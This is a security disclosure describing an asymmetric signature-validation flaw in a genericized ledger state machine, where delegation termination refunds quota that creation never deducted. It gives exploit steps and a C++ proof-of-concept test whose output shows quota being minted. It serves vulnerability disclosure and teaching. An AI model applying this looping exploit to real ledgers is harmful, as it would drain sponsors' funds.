Disclosure: Educational abstraction. Vendor details are genericized. Core state-machine flaw remains 1:1.
[CRITICAL] Asymmetric Signature Validation (Infinite Reserve Minting)
Author: Ayoub Aragui (aragui99)
Category: State Deviation
Language: C/C++
Context & Invariant
In this DLT state machine, resource delegation requires strict symmetry.
Invariant: A locked native reserve quota can only be refunded to a sponsor during termination if it was actually deducted during creation.
The Flaw
There is a structural asymmetry in ResourceDelegation.cpp.
During creation (FLAG_DELEGATE_CREATE), if a valid signature bypass is triggered, the quota deduction is skipped (the -delta subtraction never happens).
However, during termination (FLAG_DELEGATE_END), the protocol blindly refunds the quota (+delta) without checking the initial funding state of the object.
Bypass creation skips -delta. Blind termination applies +delta unconditionally.
The Exploit
An attacker exploits this gap by looping asymmetric transitions:
1.	Submit a generic ledger object.
2.	Submit DelegateCreate with the signature bypass (Quota remains unchanged).
3.	Submit DelegateEnd. The protocol blindly refunds 1 quota.
Impact: The attacker mints "ghost quotas" out of thin air (Quota_{final} = Quota_{initial} + 1). By looping this zero-constraint execution, they drain the native reserve cost directly from the Sponsor's balance, leading to a 100% loss of funds.
PoC (State Deviation)

#include <dlt_core/testing/env.h>
using namespace dlt::test;

class del_aragui99_test : public test_suite {
public:
    void run() override {
        test_env env;
        account spn("sponsor"), atk("attacker");
        env.fund(10000, spn, atk);

        // setup initial delegation
        env(json{{"TransactionType", "DelegationSet"}, {"Account", spn.human()}, {"Delegatee", atk.human()}, {"ReserveCount", 1}});
        std::cout << "\n[*] aragui99 - Init Quota: " << env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount) << "\n";

        auto target = keylet::line(atk, spn);

        // trigger bypass on creation
        env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_CREATE}}, with_signature(spn));
        std::cout << "[*] aragui99 - Quota after bypass: " << env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount) << "\n";

        // trigger blind refund
        env(json{{"TransactionType", "DelegationTransfer"}, {"Account", atk.human()}, {"ObjectID", strHex(target)}, {"Flags", FLAG_DELEGATE_END}});
        
        auto final_q = env.le(keylet::delegation(spn, atk))->getFieldU32(sfReserveCount);
        std::cout << "[!] aragui99 - Final Quota (MINTED): " << final_q << "\n\n";

        assert(final_q == 2); // boom. minted from thin air.
    }
};

int main() { 
    del_aragui99_test t; 
    t.run(); 
    return 0; 
}


[*] aragui99 - Init Quota: 1
[*] aragui99 - Quota after bypass: 1
[!] aragui99 - Final Quota (MINTED): 2
